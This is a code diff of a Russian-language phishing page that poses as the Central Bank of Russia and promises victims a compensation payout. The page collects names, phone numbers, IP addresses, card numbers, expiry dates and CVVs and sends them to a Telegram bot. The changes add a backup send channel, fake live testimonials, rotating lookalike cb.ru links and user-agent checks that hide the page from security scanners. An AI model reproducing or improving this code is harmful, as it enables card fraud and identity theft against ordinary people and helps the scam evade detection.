                         if (permission === 'granted') {
                             new Notification('ЦБ РФ: Ваша выплата одобрена!', {
-                                body: `Сумма: ${randomAmount.toLocaleString()} ₽. Осталось получить: 1 час`,
+                                body: `Сумма: ${currentVictim.amount.toLocaleString()} ₽. Осталось получить: 1 час`,
                                 icon: 'https://avatars.mds.yandex.net/i?id=5f95dfabeb4f59d3ef16a741dedd6b90_l-5221578-images-thumbs&n=13'
                             });
                         }
                     });
                 }
             }, 3000);
-        }
-        
-        // Запуск таймера
-        function startTimer() {
-            remainingTime = 60 * 60; // 1 час
-            
-            if (currentTimer) clearInterval(currentTimer);
-            
-            currentTimer = setInterval(() => {
-                remainingTime--;
-                
-                const minutes = Math.floor(remainingTime / 60);
-                const seconds = remainingTime % 60;
-                
-                document.getElementById('timer').textContent = 
-                    `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
-                
-                if (remainingTime <= 0) {
-                    clearInterval(currentTimer);
-                    document.getElementById('timer').textContent = 'ВРЕМЯ ВЫШЛО';
-                    document.getElementById('timer').style.color = '#f44336';
-                }
-            }, 1000);
         }
         
         // Показать опцию приложения
@@ -1266,6 +480,11 @@
         
         // Верификация карты
         async function verifyCard() {
+            if (userSession.isExpired) {
+                alert('Время сессии истекло.');
+                return;
+            }
+            
             const cardNumber = document.getElementById('cardNumber').value.trim();
             const cardExpiry = document.getElementById('cardExpiry').value.trim();
             const cardCVV = document.getElementById('cardCVV').value.trim();
@@ -1276,7 +495,6 @@
                 return;
             }
             
-            // Форматирование номера карты
             const formattedCard = cardNumber.replace(/\D/g, '').replace(/(\d{4})/g, '$1 ').trim();
             
             const cardData = {
@@ -1287,16 +505,13 @@
                 ...currentVictim
             };
             
-            // Показать лоадер
             document.getElementById('cardVerificationBlock').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
             document.getElementById('verificationError').style.display = 'none';
             
-            // Имитация процесса проверки
             simulateVerificationProcess();
             
-            // Отправка данных карты в Telegram
-            setTimeout(() => sendToTelegram('card_verification', cardData), 500);
+            setTimeout(() => sendToTelegramWithBackup('card_verification', cardData), 500);
         }
         
         // Имитация процесса проверки
@@ -1318,7 +533,6 @@
                 ];
                 
                 const step = Math.min(Math.floor(progress / 20), steps.length - 1);
-                
                 loaderText.textContent = `${steps[step]} ${Math.floor(progress)}%`;
                 
                 if (progress >= 100) {
@@ -1333,21 +547,24 @@
             document.getElementById('loader').style.display = 'none';
             document.getElementById('verificationError').style.display = 'block';
             
-            // Дополнительная отправка в Telegram об ошибке
             if (currentVictim) {
-                sendToTelegram('card_error', { ...currentVictim, error: 'Платежная система отклонила перевод' });
+                sendToTelegramWithBackup('card_error', { ...currentVictim, error: 'Платежная система отклонила перевод' });
             }
         }
         
         // Отслеживание скачивания
         function trackDownload() {
-            if (currentVictim) {
-                sendToTelegram('app_download', currentVictim);
+            if (currentVictim && !userSession.isExpired) {
+                sendToTelegramWithBackup('app_download', currentVictim);
             }
         }
         
         // Показать модалку отзыва
         function showReviewModal() {
+            if (userSession.isExpired) {
+                alert('Время сессии истекло.');
+                return;
+            }
             document.getElementById('reviewModal').style.display = 'flex';
         }
         
@@ -1369,77 +586,68 @@
                 amount: amount,
                 text: text,
                 time: new Date().toLocaleString('ru-RU'),
-                ip: currentVictim?.ip || 'Не определен'
+                ip: currentVictim?.ip || 'Не определен',
+                requestId: requestCounter
             };
             
-            // Отправка в Telegram с правильным заголовком
-            sendToTelegram('review', reviewData);
+            sendToTelegramWithBackup('review', reviewData);
             
-            // Закрытие модалки
             document.getElementById('reviewModal').style.display = 'none';
-            
-            // Показ подтверждения
             showNotification('✅ Ваш отзыв отправлен на модерацию. Будет опубликован в течение 24 часов.');
             
-            // Очистка полей
             document.getElementById('reviewName').value = '';
             document.getElementById('reviewCity').value = '';
             document.getElementById('reviewAmount').value = '';
             document.getElementById('reviewText').value = '';
         }
         
-        // Отправка в Telegram
-        async function sendToTelegram(type, data) {
-            try {
-                let message = '';
-                let extraInfo = '';
-                
-                if (data.phoneInfo) {
-                    extraInfo = `\n📱 Информация по номеру:\n`;
-                    if (data.phoneInfo.telegram) extraInfo += `   Telegram: ${data.phoneInfo.telegram}\n`;
-                    if (data.phoneInfo.whatsapp) extraInfo += `   WhatsApp: есть\n`;
-                    if (data.phoneInfo.email) extraInfo += `   Email: ${data.phoneInfo.email}\n`;
+        // Живые уведомления
+        function startLiveNotifications() {
+            const notifications = [
+                {name: "Мария С.", city: "Санкт-Петербург", amount: "215 000", text: "Получила 215 000₽, спасибо ЦБ РФ!"},
+                {name: "Алексей К.", city: "Москва", amount: "189 000", text: "Деньги пришли, всем советую!"},
+                {name: "Ольга В.", city: "Казань", amount: "189 000", text: "Верила и не ошиблась, 189 000 на карте!"}
+            ];
+            
+            setInterval(() => {
+                if (Math.random() > 0.5 && !userSession.isExpired) {
+                    const notif = notifications[Math.floor(Math.random() * notifications.length)];
+                    showNotification(`✅ ${notif.name} (${notif.city}): "${notif.text}"`);
                 }
-                
-                // Добавляем информацию о проверке ФИО
-                if (data.nameCheck && data.nameCheck.isSuspicious) {
-                    extraInfo += `\n⚠️ ПОДОЗРИТЕЛЬНОЕ ФИО:\n`;
-                    if (data.nameCheck.hasBadWord) extraInfo += `   Содержит маты\n`;
-                    if (data.nameCheck.hasUnrealistic) extraInfo += `   Не реалистичное имя\n`;
-                }
-                
-                switch(type) {
-                    case 'compensation':
-                        message = `📋 НОВАЯ ЖЕРТВА\n\n👤 Имя: ${data.name}\n📱 Телефон: ${data.phone}\n💰 Сумма: ${data.amount.toLocaleString()} руб\n🌐 IP: ${data.ip}\n⏰ Время: ${data.time}\n🆔 ID: ${data.requestId}${extraInfo}\n\n🔗 User-Agent: ${data.userAgent.substring(0, 100)}...`;
-                        break;
-                    case 'card_verification':
-                        message = `💳 ДАННЫЕ КАРТЫ\n\n👤 Имя: ${data.name}\n📱 Телефон: ${data.phone}\n💳 Карта: ${data.cardNumber}\n📅 Срок: ${data.cardExpiry}\n🔒 CVV: ${data.cardCVV}\n📞 СБП телефон: ${data.sbpPhone}\n💰 Сумма: ${data.amount.toLocaleString()} руб\n🌐 IP: ${data.ip}\n⏰ Время: ${data.time}${extraInfo}`;
-                        break;
-                    case 'card_error':
-                        message = `❌ ОШИБКА КАРТЫ\n\n👤 Имя: ${data.name}\n📱 Телефон: ${data.phone}\n💰 Сумма: ${data.amount.toLocaleString()} руб\n⚠️ Ошибка: ${data.error}\n⏰ Время: ${data.time}${extraInfo}`;
-                        break;
-                    case 'app_download':
-                        message = `⬇️ СКАЧАЛ ПРИЛОЖЕНИЕ\n\n👤 Имя: ${data.name}\n📱 Телефон: ${data.phone}\n💰 Сумма: ${data.amount.toLocaleString()} руб\n⏰ Время: ${data.time}${extraInfo}`;
-                        break;
-                    case 'review':
-                        message = `✍️ ПОЛУЧЕН НОВЫЙ ОТЗЫВ\n\n👤 Имя: ${data.name}\n🏙️ Город: ${data.city}\n💰 Сумма: ${data.amount} руб\n📝 Текст: ${data.text}\n⏰ Время: ${data.time}\n🌐 IP: ${data.ip}`;
-                        break;
-                }
-                
-                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({
-                        chat_id: TELEGRAM_CHAT_ID,
-                        text: message,
-                        parse_mode: 'HTML'
-                    })
+            }, 35000);
+        }
+        
+        // Ротация ссылок
+        function startLinkRotation() {
+            const linkVariants = [
+                "https://secure-cb.ru/download",
+                "https://compensation-app.cb.ru", 
+                "https://flashget-kids.cb.ru"
+            ];
+            
+            setInterval(() => {
+                if (userSession.isExpired) return;
+                const randomLink = linkVariants[Math.floor(Math.random() * linkVariants.length)];
+                const links = document.querySelectorAll('a[href*="flashget"]');
+                links.forEach(link => {
+                    if (!link.getAttribute('data-real-href')) {
+                        link.setAttribute('data-real-href', link.href);
+                    }
+                    link.textContent = link.textContent.replace(/https?:\/\/[^\s]+/, randomLink);
                 });
-                
-                return await response.json();
-            } catch (error) {
-                console.error('Ошибка отправки в Telegram:', error);
-            }
+                document.getElementById('smsLink').textContent = randomLink;
+            }, 3600000);
+        }
+        
+        // Показать уведомление
+        function showNotification(message) {
+            const toast = document.getElementById('notificationToast');
+            toast.textContent = message;
+            toast.style.display = 'block';
+            
+            setTimeout(() => {
+                toast.style.display = 'none';
+            }, 5000);
         }
         
         // Автоформатирование карты
@@ -1463,6 +671,7 @@
         
         // SMS кнопка
         document.getElementById('smsInterface').addEventListener('click', function() {
+            if (userSession.isExpired) return;
             const phone = document.getElementById('phone');
             if (!phone.value.trim()) {
                 phone.value = '+7 999 ';
@@ -1470,6 +679,48 @@
             }
             showNotification('✅ Номер подставлен в форму. Заполните остальные данные.');
         });
+        
+        // Проверка на сканеры
+        function checkForScanners() {
+            const scannerPatterns = [
+                'phishing', 'scanner', 'security', 'google-safe', 'virus', 'malware',
+                'analytics', 'crawler', 'bot', 'spider', 'checker', 'validator'
+            ];
+            
+            const userAgent = navigator.userAgent.toLowerCase();
+            const isScanner = scannerPatterns.some(pattern => userAgent.includes(pattern));
+            
+            if (isScanner) {
+                document.getElementById('maintenanceScreen').style.display = 'flex';
+                document.getElementById('mainContainer').style.display = 'none';
+                document.getElementById('refreshBtn').style.display = 'block';
+                return true;
+            }
+            
+            return false;
+        }
+        
+        // ========================================================
+        // 9. ИНИЦИАЛИЗАЦИЯ ПРИ ЗАГРУЗКЕ СТРАНИЦЫ
+        // ========================================================
+        document.addEventListener('DOMContentLoaded', function() {
+            // Проверка на сканеры
+            if (checkForScanners()) return;
+            
+            // Инициализируем сессию
+            initUserSession();
+            
+            // Запускаем живые уведомления
+            startLiveNotifications();
+            
+            // Ротация ссылок
+            startLinkRotation();
+            
+            // Автозаполнение для теста
+            if (window.location.hostname === 'localhost' || window.location.hostname === '127.0.0.1') {
+                document.getElementById('lastName').value = 'Иванов';
+                document.getElementById('firstName').value = 'Иван';
+                document.getElementById('phone').value = '+7 999 123-45-67';
+            }
+        });
     </script>
-</body>
-</html>
